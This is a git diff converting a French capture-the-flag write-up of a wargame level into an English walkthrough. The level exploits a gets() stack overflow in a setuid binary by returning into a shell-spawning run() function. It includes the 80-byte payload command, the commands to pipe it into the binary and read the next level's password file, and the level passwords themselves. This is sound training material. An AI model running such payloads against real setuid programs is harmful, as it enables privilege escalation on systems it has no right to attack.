@@ -1,17 +1,25 @@
-# RainFall - Level 1
-
-## Keypass for level2
-53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
-
-## Objectif
-
-Exploiter le binaire `level1` (setuid level2) afin d'obtenir un shell et lire le fichier `/home/user/level2/.pass`.
+# Level 01 — Walkthrough
 
 ---
 
-## Analyse du binaire
+## Overview
 
-### Source approximative
+| | |
+|---|---|
+| **Binary** | `level1` |
+| **User** | `level1` |
+| **Goal user** | `level2` |
+| **Protections** | *(no canary, no blocking NX at this level)* |
+| **Password (current level)** | `1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a` |
+| **Password (obtained)** | `53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77` |
+
+**Objective:** exploit the `level1` binary (setuid `level2`) so as to obtain a shell and read `/home/user/level2/.pass`.
+
+---
+
+## 1. Reconnaissance
+
+Approximate reconstruction of the source:
 
 ```c
 #include <stdio.h>
@@ -33,110 +41,109 @@ int main(void)
 }
 ```
 
-### Points clés
-
-- Buffer de **76 octets**
-- `gets()` → buffer overflow possible
-- Présence d'une fonction `run()` qui lance un shell (`/bin/sh`)
-- Aucun filtre ni protection particulière (pas de canary, pas de NX bloquant dans ce niveau)
-
-### Problème
-
-Le programme lit une entrée utilisateur dans un buffer de taille fixe sans vérification de longueur.
-Il est possible d'écraser l'adresse de retour de `main` pour rediriger l'exécution vers la fonction `run`.
+The binary reads user input into a fixed buffer, and contains — unused by the ordinary flow of execution — a function that spawns a shell.
 
 ---
 
-## Solution : Retour vers la fonction `run`
+## 2. Static Analysis
 
-### Idée
+- A buffer of **76 bytes**.
+- Use of `gets()` — a function admitting no bound upon the length it reads, and thus a buffer overflow becomes possible.
+- Presence of a `run()` function, which writes a message and then executes `/bin/sh`.
+- No canary, no filter, no obstruction of note at this level.
 
-1. Trouver l'adresse de la fonction `run`
-2. Écraser l'adresse de retour avec cette adresse
-3. Le programme saute dans `run` → shell obtenu
+The program reads input without verifying its length; it therefore becomes possible to overwrite the return address of `main` and redirect execution toward `run`.
 
-### Recherche de l'adresse de `run`
+---
+
+## 3. Dynamic Analysis
+
+The address of `run` was located both by static means and by confirmation under the debugger:
 
 ```bash
 objdump -d level1 | grep -A5 "<run>"
 ```
 
-ou dans GDB :
+or, within GDB:
 
 ```gdb
 disas run
 ```
 
-Adresse typique :
+yielding an address of the form `0x08048444` (to be verified against the actual binary in hand).
 
+The offset separating the start of the buffer from the return address was computed thus:
+
+- Buffer: 76 bytes
+- Saved EBP: 4 bytes
+- Return address: 4 bytes
+
+— amounting to **80 bytes** of padding before the return address.
+
+Verification under GDB:
+
+```gdb
+gdb ./level1
+(gdb) b *main
+(gdb) run < /tmp/payload
+(gdb) disas run                  # confirm the address
+(gdb) x/wx $ebp+4                # verify the return address was indeed overwritten
+(gdb) c
 ```
-0x08048444
-```
-
-(à vérifier sur le binaire réel)
-
-### Calcul de l'offset
-
-- Buffer : 76 octets
-- Saved EBP : 4 octets
-- Adresse de retour : 4 octets
-
-→ **80 octets** de padding avant l'adresse de retour.
 
 ---
 
-## Construction du payload
+## 4. Vulnerability
+
+An unbounded `gets()` call upon a stack buffer, permitting the overwriting of the saved return address — a classical stack buffer overflow, unguarded by any canary.
+
+---
+
+## 5. Exploitation
+
+**Strategy:** a return to an existing function within the binary itself (ret2text / ret2win) — namely `run`.
+
+The payload is constructed as 80 bytes of padding, followed by the address of `run` in little-endian form:
 
 ```bash
 python -c 'print "A"*80 + "\x44\x84\x04\x08"' > /tmp/payload
 ```
 
-Remplacer `\x44\x84\x04\x08` par l'adresse réelle de `run` en little-endian.
+(the four trailing bytes to be replaced with the true address of `run`).
 
-### Vérification de la taille
+Its size was verified:
 
 ```bash
 wc -c /tmp/payload
-# doit afficher 84
+# should show 84
 ```
 
----
-
-## Exploitation
+The payload was then delivered thus:
 
 ```bash
 (cat /tmp/payload; cat) | ./level1
 ```
 
-Une fois le shell obtenu :
+---
+
+## 6. Result
+
+Once the shell is obtained:
 
 ```bash
 id
 cat /home/user/level2/.pass
 ```
 
----
-
-## Vérification sous GDB
-
-```gdb
-gdb ./level1
-(gdb) b *main
-(gdb) run < /tmp/payload
-(gdb) disas run                  # confirmer l'adresse
-(gdb) x/wx $ebp+4                # vérifier que l'adresse de retour a bien été écrasée
-(gdb) c
-```
+| Step | Description |
+|------|-------------|
+| 1 | Buffer overflow via `gets` |
+| 2 | 80 bytes of padding to reach the return address |
+| 3 | Overwrite the return address with the address of `run` |
+| 4 | The program jumps into `run` — shell obtained |
 
 ---
 
-## Résumé de la technique
+## Notes & Lessons
 
-| Étape | Description |
-|-------|-------------|
-| 1 | Overflow du buffer via `gets` |
-| 2 | Padding de 80 octets pour atteindre l'adresse de retour |
-| 3 | Écrasement de l'adresse de retour avec l'adresse de `run` |
-| 4 | Le programme saute dans `run` → shell |
-
-Cette technique est un **retour vers une fonction existante** (ret2text / ret2win).
+This level illustrates the most elementary form of stack exploitation: redirecting execution toward code already present within the binary, without recourse to injected shellcode.
